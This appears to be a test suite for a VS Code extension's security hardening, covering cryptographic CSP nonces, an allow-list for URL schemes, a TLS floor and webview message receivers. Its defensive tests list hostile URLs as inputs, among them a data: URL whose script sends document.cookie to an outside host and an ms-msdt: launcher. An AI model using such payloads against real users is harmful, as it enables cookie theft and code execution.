// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 MessageFoundry Organization and contributors
import * as assert from "assert";
import * as fs from "fs";
import type * as httpsTypes from "node:https";
import * as path from "path";

import { nonce } from "../../cspNonce";
import { assertBrowsableUrl, assertTargetAllowed } from "../../engineTarget";
import { getJson, postJson } from "../../engineClient";
import { WEBVIEW_ORIGIN_NOTE } from "../../webviewMessaging";

// Four hardening properties of the extension, asserted against the SOURCE as well as against
// behaviour. Reading the source matters here for a measured reason: the extension has already shipped
// a broken artifact because nothing read the file it lived in, and every one of these defects is the
// kind that reappears in the NEXT panel someone adds rather than in the ones fixed today. A test that
// only exercises the code paths that exist now would pass while the same defect walked back in.
//
// Every scan below prints what it scanned and carries a vacuity guard, because a source scan that
// silently matches nothing is indistinguishable from a clean repo.

const IDE_ROOT = path.join(__dirname, "..", "..", "..");
const SRC = path.join(IDE_ROOT, "src");

/** Every production .ts under src/, i.e. excluding the test tree itself. */
function productionSources(): { file: string; rel: string; text: string }[] {
  const out: { file: string; rel: string; text: string }[] = [];
  const walk = (dir: string): void => {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        if (entry.name !== "test") {
          walk(full);
        }
      } else if (entry.name.endsWith(".ts")) {
        out.push({ file: full, rel: path.relative(SRC, full), text: fs.readFileSync(full, "utf8") });
      }
    }
  };
  walk(SRC);
  return out;
}

/**
 * The webview scripts shipped as static assets rather than as HTML-string literals in a .ts.
 *
 * They are the same kind of code as the receivers and nonces scanned below — `media/stepsWebview.js`
 * is loaded into a real webview via `localResourceRoots` — so a scan restricted to `src/**` has a
 * blind spot exactly where the next occurrence could land. Measured at the time of writing: zero
 * `Math.random` call sites and zero message receivers there, so widening the corpus changes no count
 * today; it is what makes tomorrow's addition visible.
 */
function webviewAssetSources(): { file: string; rel: string; text: string }[] {
  const dir = path.join(IDE_ROOT, "media");
  if (!fs.existsSync(dir)) {
    return [];
  }
  return fs
    .readdirSync(dir)
    .filter((n) => n.endsWith(".js"))
    .map((n) => ({
      file: path.join(dir, n),
      rel: `media/${n}`,
      text: fs.readFileSync(path.join(dir, n), "utf8"),
    }));
}

/** Every file that can carry a CSP nonce or a webview message receiver. */
function webviewCodeSources(): { file: string; rel: string; text: string }[] {
  return [...productionSources(), ...webviewAssetSources()];
}

suite("extension hardening — the source corpus is actually being read", () => {
  test("the scan sees a real, non-trivial set of production sources", () => {
    // POSITIVE CONTROL for every scan in this file. If productionSources() ever returns nothing (a
    // moved directory, a changed extension, a broken join), every "no offending line found" assertion
    // below would pass vacuously and report a clean repo. Anchor it on a count and on a known file.
    const sources = productionSources();
    assert.ok(
      sources.length > 40,
      `expected the extension's production sources; scanned ${sources.length} files under ${SRC}`,
    );
    assert.ok(
      sources.some((s) => s.rel === "engineClient.ts"),
      `the scan did not find engineClient.ts; it scanned ${sources.map((s) => s.rel).join(", ")}`,
    );
  });

  test("the scan also reaches the webview scripts shipped as static assets", () => {
    // SECOND POSITIVE CONTROL, for the half of the corpus that does not live under src/. Without it
    // the nonce and receiver scans below would report a clean media/ directory whether or not they
    // ever opened one.
    const assets = webviewAssetSources();
    assert.ok(
      assets.some((a) => a.rel === "media/stepsWebview.js"),
      `the scan did not reach media/; it found ${assets.map((a) => a.rel).join(", ") || "nothing"}`,
    );
  });
});

suite("CSP nonces come from a cryptographic source", () => {
  test("no production source generates a nonce from Math.random", () => {
    // The security property is the ENTROPY SOURCE, not the length. A CSP nonce is a capability —
    // script-src 'nonce-X' executes any script presenting X — so a predictable X converts markup
    // injection into script execution. Math.random is a non-cryptographic PRNG whose state is
    // recoverable from its output, and twelve hand-copied generators used it.
    const sources = webviewCodeSources();
    const offenders = sources.flatMap(({ rel, text }) =>
      text
        .split(/\r?\n/)
        .map((line, i) => ({ rel, line: line.trim(), n: i + 1 }))
        // The rationale in cspNonce.ts NAMES Math.random to explain why it is unusable, so match
        // calls only and not prose. A bare mention in a comment is not a use.
        .filter(({ line }) => /Math\s*\.\s*random\s*\(/.test(line) && !line.startsWith("//")),
    );
    assert.deepStrictEqual(
      offenders.map((o) => `${o.rel}:${o.n} ${o.line}`),
      [],
      `scanned ${sources.length} files under ${SRC} and the media/ webview assets`,
    );
  });

  test("the nonce generator draws from node:crypto, which is the extension-host API", () => {
    // The correctness trap: the extension host (Node) and a webview (browser) have DIFFERENT crypto
    // APIs. Every nonce here is built host-side while composing the HTML, before the webview exists,
    // so node:crypto is the right one and crypto.getRandomValues is not even in scope. Asserted on
    // the source because the alternative — inferring the entropy source from output — cannot
    // distinguish a good generator from a lucky one.
    const text = fs.readFileSync(path.join(SRC, "cspNonce.ts"), "utf8");
    assert.ok(/from "node:crypto"/.test(text), "cspNonce.ts must import node:crypto");
    assert.ok(/randomBytes\s*\(/.test(text), "cspNonce.ts must call randomBytes");
  });

  test("nonces are unguessable in shape: full length, CSP-safe alphabet, never repeated", () => {
    const values = Array.from({ length: 500 }, () => nonce());
    for (const v of values) {
      assert.strictEqual(v.length, 24, `unexpected nonce length: ${v}`);
      // base64url only, so the value is safe verbatim in both the nonce="" attribute and the
      // 'nonce-...' CSP directive with nothing to escape.
      assert.ok(/^[A-Za-z0-9_-]{24}$/.test(v), `nonce outside the base64url alphabet: ${v}`);
    }
    assert.strictEqual(new Set(values).size, values.length, "a nonce repeated within 500 draws");
  });
});

suite("every external URL open passes a positive scheme allow-list", () => {
  test("hostile schemes are refused by both gates", () => {
    // These are the exact values that passed the pre-change deny-list gate. openExternal routes to
    // the OS handler, so a recognised scheme LAUNCHES AN APPLICATION rather than opening a page —
    // ms-msdt: being the well-known example. A deny-list cannot cover this: the handler registry is
    // open-ended, so the set to refuse is unbounded.
    const hostile = [
      "javascript:alert(1)",
      "file:///C:/Windows/System32/calc.exe",
      "data:text/html,<script>fetch('http://x/'+document.cookie)</script>",
      "vscode://ms-vscode.node-debug/launch",
      "ms-msdt:/id PCWDiagnostic",
      "ftp://example.com/x",
    ];
    for (const url of hostile) {
      assert.strictEqual(assertBrowsableUrl(url).ok, false, `assertBrowsableUrl admitted ${url}`);
      assert.strictEqual(assertTargetAllowed(url).ok, false, `assertTargetAllowed admitted ${url}`);
    }
  });

  test("the legitimate schemes still pass, so the allow-list is not merely refusing everything", () => {
    // NEGATIVE CONTROL for the test above: a gate that returned ok:false unconditionally would pass
    // it while breaking the extension outright.
    assert.strictEqual(assertBrowsableUrl("http://127.0.0.1:8765/ui").ok, true);
    assert.strictEqual(assertBrowsableUrl("https://engine.example.com/ui").ok, true);
    assert.strictEqual(assertBrowsableUrl("http://engine.example.com/ui").ok, true);
    assert.strictEqual(assertTargetAllowed("http://127.0.0.1:8765").ok, true);
    assert.strictEqual(assertTargetAllowed("https://engine.example.com").ok, true);
  });

  test("a refusal names the scheme it rejected, so the failure is diagnosable", () => {
    const r = assertBrowsableUrl("file:///etc/passwd");
    assert.ok(!r.ok && /file:/.test(r.reason), `unhelpful refusal: ${JSON.stringify(r)}`);
  });

  // WHAT THIS PAIR OF TESTS CAN AND CANNOT PROVE, stated plainly so nobody reads them as stronger
  // than they are. A source scan cannot do data-flow, so it cannot prove that the guard above a call
  // is the guard FOR that call. What it can do is refuse to let a call site appear without review:
  // the census below is pinned by module and by argument expression, so a second openExternal — even
  // one added inside a function that already guards a different value — fails until someone puts it
  // in the list. That is the property that actually survives a new panel being added. An earlier
  // version of this test asked only whether the MODULE mentioned the guard anywhere, which every
  // module containing one call already satisfies; it therefore could not fail for a per-site defect.

  /** Every openExternal call site: the module, and the expression handed to Uri.parse. */
  function openExternalSites(): { rel: string; n: number; arg: string; line: string }[] {
    const out: { rel: string; n: number; arg: string; line: string }[] = [];
    for (const { rel, text } of productionSources()) {
      text.split(/\r?\n/).forEach((raw, i) => {
        const line = raw.trim();
        if (line.startsWith("//") || line.startsWith("*")) {
          return; // prose naming the API is not a call site
        }
        if (!/openExternal\s*\(/.test(line)) {
          return;
        }
        const m = /openExternal\(\s*vscode\.Uri\.parse\(\s*(.+?)\s*\)\s*\)/.exec(line);
        assert.ok(
          m,
          `openExternal call at ${rel}:${i + 1} is not in the single-line vscode.Uri.parse shape this ` +
            `scan can read, so it would be classified silently. Rewrite it or teach the scan: ${line}`,
        );
        out.push({ rel, n: i + 1, arg: m[1], line });
      });
    }
    return out;
  }

  test("the set of openExternal call sites is exactly the reviewed set", () => {
    // TRIPWIRE, same design as the webview receiver count. Deliberately pinned on module + argument
    // rather than on line numbers, so ordinary edits above a call do not churn it but a NEW call
    // does. If this fails because you added a legitimate one: screen it with assertBrowsableUrl,
    // then add it here.
    const sites = openExternalSites();
    assert.deepStrictEqual(
      sites.map((s) => `${s.rel} :: ${s.arg}`).sort(),
      [
        'sourceControl.ts :: "https://git-scm.com/downloads"',
        "auth.ts :: target",
        "statusBar.ts :: url",
      ].sort(),
      "a new openExternal call site appeared; screen its scheme and add it to this list",
    );
  });

  test("every dynamic openExternal call site screens its own argument first", () => {
    const sources = productionSources();
    const sites = openExternalSites();
    assert.ok(
      sites.length >= 3,
      `VACUITY GUARD: expected the known openExternal call sites, found ${sites.length}`,
    );
    const dynamic = sites.filter((s) => !/^"https?:\/\//.test(s.arg));
    assert.ok(
      dynamic.length >= 2,
      `VACUITY GUARD: the literal exemption swallowed the whole census (${sites.length} sites, ${dynamic.length} dynamic)`,
    );
    const unguarded = dynamic.filter(({ rel, n, arg }) => {
      const lines = sources.find((s) => s.rel === rel)!.text.split(/\r?\n/);
      // The guard must screen THIS call's exact argument, and its refusal branch must return before
      // reaching the call -- a guard whose result is discarded is decoration.
      const before = lines.slice(Math.max(0, n - 25), n - 1).join("\n");
      const escaped = arg.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      const guard = new RegExp(
        `const\\s+(\\w+)\\s*=\\s*assertBrowsableUrl\\(\\s*${escaped}\\s*\\)[\\s\\S]*?` +
          `if\\s*\\(\\s*!\\s*\\1\\.ok\\s*\\)[\\s\\S]*?return\\s*;`,
      );
      return !guard.test(before);
    });
    assert.deepStrictEqual(
      unguarded.map((u) => `${u.rel}:${u.n} ${u.line}`),
      [],
      "every dynamic openExternal must screen its own argument with assertBrowsableUrl and return on refusal",
    );
  });
});

suite("https requests carry a pinned TLS floor", () => {
  // Asserted BEHAVIOURALLY — on the options object the client actually hands the TLS layer — rather
  // than by grepping for the string. The defect was an inherited process-wide default
  // (NODE_OPTIONS=--tls-min-v1.0 lowers tls.DEFAULT_MIN_VERSION for the whole process and every
  // request silently followed it down), and only the value reaching `request` answers that.
  // Patch the MODULE object, not a namespace import. TypeScript's `import * as https` compiles to an
  // __importStar copy whose properties are getters onto the real module, so assigning to the copy
  // fails and assigning to the module is what both this file and engineClient.ts observe.
  const httpsModule = require("node:https") as { request: typeof httpsTypes.request };
  let captured: httpsTypes.RequestOptions | undefined;
  let realRequest: typeof httpsTypes.request;

  setup(() => {
    captured = undefined;
    realRequest = httpsModule.request;
    httpsModule.request = ((_url: unknown, options: httpsTypes.RequestOptions): unknown => {
      captured = options;
      throw new Error("intercepted before the socket");
    }) as unknown as typeof httpsTypes.request;
  });

  teardown(() => {
    httpsModule.request = realRequest;
  });

  test("getJson over https pins minVersion to TLSv1.2", async () => {
    await assert.rejects(getJson("https://engine.example.com", "/health"));
    assert.ok(captured, "the interceptor never ran — the test proves nothing");
    assert.strictEqual(captured!.minVersion, "TLSv1.2");
  });

  test("postJson over https pins minVersion to TLSv1.2", async () => {
    await assert.rejects(postJson("https://engine.example.com", "/promote", { a: 1 }));
    assert.ok(captured, "the interceptor never ran — the test proves nothing");
    assert.strictEqual(captured!.minVersion, "TLSv1.2");
  });

  test("a plain-http request does not go through the https transport at all", async () => {
    // NEGATIVE CONTROL. If the interceptor fired here, the previous two assertions would not be
    // telling us anything about scheme-conditional behaviour.
    await assert.rejects(getJson("http://127.0.0.1:1/health", "/health", undefined, 50));
    assert.strictEqual(captured, undefined, "an http:// URL must not reach https.request");
  });
});

suite("webview message receivers state the origin position explicitly", () => {
  test("every window message listener carries the documented origin note", () => {
    // Shape validation is not origin validation, and the two get conflated. VS Code exposes no
    // origin a webview could verify (a generated per-panel vscode-webview://<uuid> the extension is
    // never told), so no check is written — and the absence is recorded at every receiver rather
    // than left for a reviewer to rediscover. This test is what makes a NEW receiver answer the
    // question instead of inheriting silence.
    const sources = webviewCodeSources();
    const receivers = sources.flatMap(({ rel, text }) => {
      const lines = text.split(/\r?\n/);
      return lines
        .map((line, i) => ({ rel, line: line.trim(), n: i + 1, prev: (lines[i - 1] ?? "").trim() }))
        .filter(({ line }) => /window\.addEventListener\(\s*['"]message['"]/.test(line));
    });
    assert.strictEqual(
      receivers.length,
      8,
      `expected the 8 known webview message receivers; found ${receivers.length} across ${sources.length} files — ` +
        "a new one must be reviewed and this count updated deliberately",
    );
    const silent = receivers.filter(({ prev }) => prev !== WEBVIEW_ORIGIN_NOTE);
    assert.deepStrictEqual(
      silent.map((s) => `${s.rel}:${s.n}`),
      [],
      `each receiver must be preceded by exactly: ${WEBVIEW_ORIGIN_NOTE}`,
    );
  });

  test("every webview message receiver still discriminates on a message shape", () => {
    // The other half, and the one that actually bounds what a message can ask for. Each receiver
    // dispatches on a `command`/`type` discriminator and ignores anything else; assert that rather
    // than assume it, since an unguarded receiver would be the more serious of the two defects.
    const sources = webviewCodeSources();
    const offenders: string[] = [];
    for (const { rel, text } of sources) {
      const lines = text.split(/\r?\n/);
      lines.forEach((line, i) => {
        if (!/window\.addEventListener\(\s*['"]message['"]/.test(line)) {
          return;
        }
        const body = lines.slice(i, i + 12).join("\n");
        if (!/\.(command|type)\s*===|\b(command|type)\s*===/.test(body)) {
          offenders.push(`${rel}:${i + 1}`);
        }
      });
    }
    assert.deepStrictEqual(offenders, [], "a receiver dispatched without a shape discriminator");
  });

  test("the shared rationale says what it is relied on for", () => {
    // Guards against the note decaying into a bare "not checked" marker. The claim it must keep
    // making is that the nonce CSP is the enforcement property, which is exactly why the nonce being
    // cryptographically random (the suite above) is load-bearing and not cosmetic.
    const text = fs.readFileSync(path.join(SRC, "webviewMessaging.ts"), "utf8");
    for (const claim of ["vscode-webview://", "nonce", "cspNonce.ts"]) {
      assert.ok(text.includes(claim), `the rationale no longer mentions ${claim}`);
    }
  });
});
